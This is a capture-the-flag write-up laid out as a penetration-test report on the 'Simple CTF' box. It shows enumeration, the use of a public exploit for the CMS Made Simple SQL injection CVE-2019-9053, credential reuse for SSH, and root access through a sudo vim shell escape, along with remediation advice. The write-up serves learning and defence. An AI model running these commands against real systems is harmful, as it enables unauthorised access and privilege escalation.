# Simple CTF — CTF Writeup — Enumeration, Exploitation, and Privilege Escalation

## 1. Engagement Overview
- **Title / Project Name:** Simple CTF
- **Author:** myself
- **Date:** old
- **Objective:** Obtain user and root flags via web/CMS exploit and local privilege escalation.
- **Scope / Target:** `10.201.47.23`
- **Testing Window:** CTF box
- **Tools Used:** nmap, gobuster, ftp client, python3 (exploit), ssh, linPEAS, find, GTFOBins reference
- **Methodology Reference:** Recon → Enumeration → Exploitation → Post-exploitation → Cleanup

## 2. Short Summary
Performed network and web enumeration to identify FTP, HTTP, and SSH services. Found CMS Made Simple v2.2.8 on `/simple/` and exploited a known SQL injection (CVE-2019-9053) to recover admin credentials. Anonymous FTP revealed a hint indicating credential reuse; used the recovered credentials to SSH to the box on port 2222 as `mitch`. Performed local enumeration, identified `vim` as a SUDO/GTFOBins escalation vector and obtained root to read `/root/root.txt`.

## 3. Methodology / Process Flow

### 3.1 Reconnaissance
- Performed TCP SYN scan to discover open ports.
- Identified services and versions for targeted enumeration.

**Commands**
```
nmap -sS 10.201.47.23
nmap -sC -sV -p 21,80 10.201.47.23
```

**Key output (summary)**
- `21/tcp` — ftp (vsftpd 3.0.3) — anonymous login allowed
- `80/tcp` — http (Apache 2.4.18)
- `2222/tcp` — ssh (OpenSSH on non-standard port)

### 3.2 Enumeration
- Directory enumeration with Gobuster revealed `/robots.txt` and `/simple/`.
- Browsing `/simple/` showed CMS Made Simple v2.2.8 and a login panel.
- Anonymous FTP `pub` contained `ForMitch.txt` which hinted at credential reuse for system user `mitch`.

**Commands**
```
gobuster dir -u http://10.201.47.23 -w /usr/share/wordlists/dirb/common.txt
ftp 10.201.47.23 (anonymous)
```

### 3.3 Exploitation
- Used a public exploit for CMS Made Simple v2.2.8 (SQL injection, CVE-2019-9053) to dump admin credentials.
- Recovered credentials for user `mitch` (password: `secret`), which matched hint in FTP.
- Used SSH on port 2222 to log in as `mitch`.

**Commands / actions**
```
python3 exploit.py -u http://10.201.47.23/simple/
# Recovered: Username: mitch, Password: secret
ssh mitch@10.201.47.23 -p 2222
```

### 3.4 Post-Exploitation
- Once on the system as `mitch`, ran enumeration and linPEAS to find privilege escalation vectors.
- Located SUID/privileged binaries and identified `/usr/bin/vim` as exploitable via GTFOBins / sudo usage.

**Commands**
```
find / -perm -4000 -type f 2>/dev/null
# ran linPEAS for further enumeration
sudo vim -c ':!/bin/sh'
```

### 3.5 Persistence / Cleanup
- (CTF hygiene) Removed any tools uploaded and cleared temporary artifacts used during the engagement.
- Documented cleanup steps (if performed in a real environment, ensure evidence preservation before cleanup).

## 4. Findings Summary
| ID | Vulnerability / Issue | Severity | Impact | Recommendation |
|----|------------------------|----------:|--------|----------------|
| 1 | Outdated CMS (CMS Made Simple v2.2.8) vulnerable to SQLi (CVE-2019-9053) | High | Remote credential disclosure allowing initial access | Patch or upgrade CMS; validate and sanitize inputs; apply WAF rules |
| 2 | Credential reuse (developer/system user reusing CMS password) | High | Lateral movement / account takeover | Enforce unique passwords, rotate compromised credentials, enable MFA |
| 3 | SUDO/VIM escalation vector present | High | Local privilege escalation to root | Restrict sudo rights, avoid allowing editors with shell escapes; require vetted commands or remove SUID where unnecessary |
| 4 | Anonymous FTP exposing internal hints/files | Medium | Information leakage facilitating compromise | Disable anonymous FTP or segregate/public-only data; monitor public shares for sensitive info |

## 5. Technical Details

### Finding 1 — CMS Made Simple v2.2.8 SQL Injection (CVE-2019-9053)
- **Description:** Vulnerable CMS allowed SQL injection leading to credential disclosure.
- **Impact:** Attacker can extract user records, password hashes, and potentially credentials for administrative accounts.
- **Evidence (commands / outputs):**
  - Executed public exploit: `python3 exploit.py -u http://10.201.47.23/simple/`
  - Recovered: `Salt: 1dac0d92e9fa6bb2`, `Username: mitch`, `Hash: 0c01f446...`, `Password: secret`
- **Recommendation:** Patch/upgrade CMS, sanitize inputs, limit database privileges, enable logging/alerting for suspicious queries.

### Finding 2 — Credential Reuse / FTP Hint
- **Description:** Anonymous FTP contained `ForMitch.txt` indicating the system user `mitch` uses the same password as the CMS account.
- **Impact:** Enables straightforward lateral movement from web compromise to system login.
- **Evidence (commands / outputs):**
  - FTP `pub/ForMitch.txt` contained a hint referencing reused password.
  - Successful SSH login as `mitch` using recovered password: `secret`.
- **Recommendation:** Enforce password uniqueness, rotate credentials after compromise, and restrict sensitive information on public shares.

### Finding 3 — SUDO/VIM Escalation Vector
- **Description:** `vim` usable with sudo or SUID allows shell escape to privileged shell (per GTFOBins patterns).
- **Impact:** Local user can obtain root shell and read sensitive files such as `/root/root.txt`.
- **Evidence (commands / outputs):**
  - `sudo vim -c ':!/bin/sh'` executed resulting in root shell.
- **Recommendation:** Restrict sudo permissions, avoid granting editors with shell-escape capability via sudo, implement command whitelisting.

## 6. Remediation Plan
- **High Priority:** Upgrade CMS Made Simple to a patched version or replace with maintained software. Apply input sanitization and database access controls.
- **High Priority:** Enforce unique, strong passwords and enable MFA for administrative/system accounts. Rotate credentials revealed in incidents.
- **High Priority:** Audit and restrict sudoers entries; remove sudo access to interactive editors or use safer alternatives (e.g., `visudo` restrictions, `sudoedit` with careful configuration).
- **Medium Priority:** Disable anonymous FTP or limit to strictly public content; monitor uploads and external file shares for sensitive data.
- **Low Priority:** Harden webserver headers and cookie flags; enable security headers and logging for suspicious activity.

## 7. Appendices
**Tool outputs / commands used**
```
# Recon
nmap -sS 10.201.47.23
nmap -sC -sV -p 21,80 10.201.47.23

# Directory discovery
gobuster dir -u http://10.201.47.23 -w /usr/share/wordlists/dirb/common.txt

# CMS exploit
python3 exploit.py -u http://10.201.47.23/simple/

# FTP
ftp 10.201.47.23 (anonymous)
# inspected pub/ForMitch.txt

# SSH
ssh mitch@10.201.47.23 -p 2222

# Local enumeration
find / -perm -4000 -type f 2>/dev/null
linPEAS (used for enumeration)

# SUDO exploit via vim
sudo vim -c ':!/bin/sh'

# Flags
find / -type f -name "root.txt" 2>/dev/null
cat /root/root.txt
```

---
